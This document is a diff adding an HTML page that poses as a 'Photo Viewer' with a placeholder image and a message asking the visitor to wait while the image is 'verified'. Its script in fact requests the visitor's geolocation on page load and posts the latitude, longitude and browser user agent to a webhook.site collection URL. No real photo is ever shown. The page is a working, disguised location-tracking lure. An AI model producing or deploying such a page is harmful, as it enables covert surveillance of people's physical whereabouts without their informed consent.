@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Photo Viewer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f9f9f9;
+      padding-top: 60px;
+    }
+    .photo {
+      width: 320px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    .loading {
+      font-size: 15px;
+      color: #777;
+      margin-top: 25px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://via.placeholder.com/320x220.png?text=Photo+Loading..." alt="photo" class="photo">
+  <div class="loading">Please wait while we verify and load the image...</div>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("https://webhook.site/4296eca1-bdd3-4d84-b7ed-04611e424f53", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent
+        })
+      });
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          sendLocation(position.coords.latitude, position.coords.longitude);
+        },
+        function(error) {
+          console.error("Location access denied by user.");
+        }
+      );
+    } else {
+      alert("Geolocation not supported.");
+    }
+  </script>
+</body>
+</html>
